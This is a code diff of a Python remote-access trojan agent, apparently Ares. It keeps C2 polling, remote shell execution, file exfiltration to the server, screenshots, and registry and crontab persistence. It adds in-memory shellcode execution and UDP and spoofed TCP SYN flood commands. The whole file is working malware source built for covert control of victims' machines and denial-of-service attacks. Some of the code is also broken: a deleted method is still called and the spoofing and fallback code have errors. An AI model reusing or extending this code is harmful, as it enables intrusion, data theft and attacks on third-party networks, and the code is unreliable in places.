@@ -1,27 +1,33 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # coding: utf-8
 
-import requests
-import time
-import os
-import subprocess
-import platform
-import shutil
-import sys
-import traceback
-import threading
-import uuid
-import StringIO
-import zipfile
-import tempfile
-import socket
+import random
+from scapy.all import IP, TCP, send
+
+import config
+import ctypes
 import getpass
+import os
+import platform
+import re
+import requests
+import shutil
+import socket
+import subprocess
+import sys
+import tempfile
+import threading
+import time
+import traceback
+import uuid
+import zipfile
+
 if os.name == 'nt':
     from PIL import ImageGrab
 else:
     import pyscreenshot as ImageGrab
 
-import config
+forging = True
 
 
 def threaded(func):
@@ -89,8 +95,15 @@ class Agent(object):
 
     def server_hello(self):
         """ Ask server for instructions """
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+        req = requests.post(
+            config.SERVER + '/api/' + self.uid + '/hello',
+            verify=config.TLS_VERIFY,
+            json={
+                'platform': self.platform,
+                'hostname': self.hostname,
+                'username': self.username,
+            }
+        )
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -101,9 +114,13 @@ class Agent(object):
         if not output:
             return
         if newlines:
-            output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
-        data={'output': output})
+            output += str("\n\n")
+
+        req = requests.post(
+            config.SERVER + '/api/' + self.uid + '/report',
+            verify=config.TLS_VERIFY,
+            data={'output': output}
+        )
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -116,36 +133,13 @@ class Agent(object):
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
             output = (out + err)
+            if os.name == "nt":
+                output = output.decode('cp850')
+            else:
+                output = output.decode('utf-8', errors='replace')
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-
-    @threaded
-    def python(self, command_or_file):
-        """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
-        old_stdout = sys.stdout
-        sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
-        old_stderr = sys.stderr
-        sys.stderr = new_stderr
-        if os.path.exists(command_or_file):
-            self.send_output("[*] Running python file...")
-            with open(command_or_file, 'r') as f:
-                python_code = f.read()
-                try:
-                    exec(python_code)
-                except Exception as exc:
-                    self.send_output(traceback.format_exc())
-        else:
-            self.send_output("[*] Running python command...")
-            try:
-                exec(command_or_file)
-            except Exception as exc:
-                self.send_output(traceback.format_exc())
-        sys.stdout = old_stdout
-        sys.stderr = old_stderr
-        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())
 
     def cd(self, directory):
         """ Change current directory """
@@ -159,6 +153,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                    verify=config.TLS_VERIFY,
                     files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
@@ -197,13 +192,7 @@ class Agent(object):
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
-            if os.path.exists(self.expand_path("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
-                    f.write(desktop_entry)
-            else:
-                with open(self.expand_path("~/.bashrc"), "a") as f:
-                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+            os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
@@ -212,6 +201,9 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
+        else:
+            self.send_output('[!] Not supported.')
+            return
         self.send_output('[+] Agent installed.')
 
     def clean(self):
@@ -220,10 +212,7 @@ class Agent(object):
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
-            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
-            if os.path.exists(desktop_entry):
-                os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
@@ -259,7 +248,7 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
@@ -270,6 +259,95 @@ class Agent(object):
         screenshot.save(screenshot_file)
         self.upload(screenshot_file)
 
+    @threaded
+    def execshellcode(self, shellcode_str):
+        """ Executes given shellcode string in memory """
+        shellcode = shellcode_str.replace('\\x', '')
+        shellcode = bytes.fromhex(shellcode)
+        shellcode = bytearray(shellcode)
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                                  ctypes.c_int(len(shellcode)),
+                                                  ctypes.c_int(0x3000),
+                                                  ctypes.c_int(0x40))
+        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                             buf,
+                                             ctypes.c_int(len(shellcode)))
+        ctypes.windll.kernel32.CreateThread(
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.c_int(ptr),
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.pointer(ctypes.c_int(0)))
+        self.send_output("[+] Shellcode executed.")
+
+    @threaded
+    def udpflood(self, ip, port, duration):
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        timeout = time.time() + duration
+        sent = 0
+        payload = os.urandom(1 * 2**10)
+
+        while True:
+            if time.time() > timeout:
+                s = 'Attack on {0} has finished. Sent {1} packages.'
+                self.send_output(s.format(ip, sent))
+                return
+
+            udp_socket.sendto(payload, (ip, port))
+            sent += 1
+
+    @threaded
+    def tcpflood(self, ip, port, duration, spoofing=False):
+        forging = True
+        class send_syn(threading.Thread):
+
+            def __init__(self):
+                threading.Thread.__init__(self)
+
+            def run(self):
+                # Damn, ugly!
+                global forging
+
+                if forging:
+                    i = IP()
+                    i.dst = ip
+                    if spoofing:
+                        i.src = '.'.join(random.randint(1, 254) for _ in range(4))
+
+                    t = TCP()
+                    t.sport = random.randint(1, 65535)
+                    t.dport = port
+                    t.flags = 'S'
+
+                    try:
+                        send(i/t, verbose=0)
+                    except PermissionError:
+                        print('ohno, not forging')
+                        forging = False
+
+                else:
+                    s = socket.socket()
+                    s.connect((self.ip, self.port))
+
+        timeout = time.time() + duration
+        sent = 0
+        thread_limit = 200
+
+        # Test if packets can be forged
+        send_syn().start()
+
+        while True:
+            if time.time() > timeout:
+                s = 'Attack on {0} has finished. Total packages sent: {1}'
+                self.send_output(s.format(ip, sent))
+                return
+
+            if threading.activeCount() < thread_limit:
+                send_syn().start()
+                sent += 1
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -277,16 +355,20 @@ class Agent(object):
     def run(self):
         """ Main loop """
         self.silent = True
+
         if config.PERSIST:
             try:
                 self.persist()
             except:
                 self.log("Failed executing persistence")
+
         self.silent = False
+
         while True:
             try:
                 todo = self.server_hello()
                 self.update_consecutive_failed_connections(0)
+
                 # Something to do ?
                 if todo:
                     commandline = todo
@@ -296,19 +378,23 @@ class Agent(object):
                     split_cmd = commandline.split(" ")
                     command = split_cmd[0]
                     args = []
+
                     if len(split_cmd) > 1:
                         args = split_cmd[1:]
                     try:
+
                         if command == 'cd':
                             if not args:
                                 self.send_output('usage: cd </path/to/directory>')
                             else:
-                                self.cd(args[0])
+                                self.cd(" ".join(args))
+
                         elif command == 'upload':
                             if not args:
                                 self.send_output('usage: upload <localfile>')
                             else:
                                 self.upload(args[0],)
+
                         elif command == 'download':
                             if not args:
                                 self.send_output('usage: download <remote_url> <destination>')
@@ -317,30 +403,74 @@ class Agent(object):
                                     self.download(args[0], args[1])
                                 else:
                                     self.download(args[0])
+
                         elif command == 'clean':
                             self.clean()
+
                         elif command == 'persist':
                             self.persist()
+
                         elif command == 'exit':
                             self.exit()
+
                         elif command == 'zip':
                             if not args or len(args) < 2:
                                 self.send_output('usage: zip <archive_name> <folder>')
                             else:
                                 self.zip(args[0], " ".join(args[1:]))
+
                         elif command == 'python':
                             if not args:
                                 self.send_output('usage: python <python_file> or python <python_command>')
                             else:
                                 self.python(" ".join(args))
+
                         elif command == 'screenshot':
                             self.screenshot()
+
+                        elif command == 'execshellcode':
+                            if not args:
+                                self.send_output('usage: execshellcode <shellcode>')
+                            else:
+                                self.execshellcode(args[0])
+
+                        elif command == 'udpflood':
+                            if not args or len(args) != 3:
+                                self.send_output('usage: udpflood <ip> <port> <duration in seconds>')
+                            else:
+                                ip, port, duration = args
+                                if not re.match(r'\d+\.\d+\.\d+\.\d+$', ip):
+                                    self.send_output('[error] Not a valid IP')
+                                elif not port:
+                                    self.send_output('[error] Not a valid port')
+                                elif not duration:
+                                    self.send_output('[error] Not a valid duration')
+                                else:
+                                    self.udpflood(ip, int(port), int(duration))
+
+                        elif command == 'tcpflood':
+                            if not args or len(args) != 3:
+                                self.send_output('usage: tcpflood <ip> <port> <duration in seconds>')
+                            else:
+                                ip, port, duration = args
+                                if not re.match(r'\d+\.\d+\.\d+\.\d+$', ip):
+                                    self.send_output('[error] Not a valid IP')
+                                elif not port:
+                                    self.send_output('[error] Not a valid port')
+                                elif not duration:
+                                    self.send_output('[error] Not a valid duration')
+                                else:
+                                    self.tcpflood(ip, int(port), int(duration))
+
                         elif command == 'help':
                             self.help()
+
                         else:
                             self.runcmd(commandline)
+
                     except Exception as exc:
                         self.send_output(traceback.format_exc())
+
                 else:
                     if self.idle:
                         time.sleep(config.HELLO_INTERVAL)
@@ -349,6 +479,7 @@ class Agent(object):
                         self.idle = True
                     else:
                         time.sleep(0.5)
+
             except Exception as exc:
                 self.log(traceback.format_exc())
                 failed_connections = self.get_consecutive_failed_connections()
@@ -361,9 +492,11 @@ class Agent(object):
                     self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
+
 def main():
     agent = Agent()
     agent.run()
+
 
 if __name__ == "__main__":
     main()
